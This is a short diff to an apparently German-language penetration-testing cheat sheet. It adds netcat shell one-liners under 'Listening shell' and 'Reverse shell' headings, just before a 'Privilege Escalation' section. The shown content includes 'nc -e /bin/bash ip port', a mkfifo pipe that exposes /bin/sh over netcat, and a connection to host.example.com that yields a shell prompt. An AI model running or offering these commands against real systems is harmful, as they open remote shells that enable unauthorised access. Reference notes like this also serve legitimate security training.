@@ -157,9 +157,20 @@ Listening shell:
 nc -lvnp 4000
 ```
 
+Ohne -e:
+```bash
+rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
+```
+
 Reverse shell:
 ```bash
 nc -e "/bin/bash" ip port
+```
+Ohne -e
+```bash
+nc host.example.com 1234
+(shell prompt from host.example.com)
 ```
 
 # Privilege Escalation
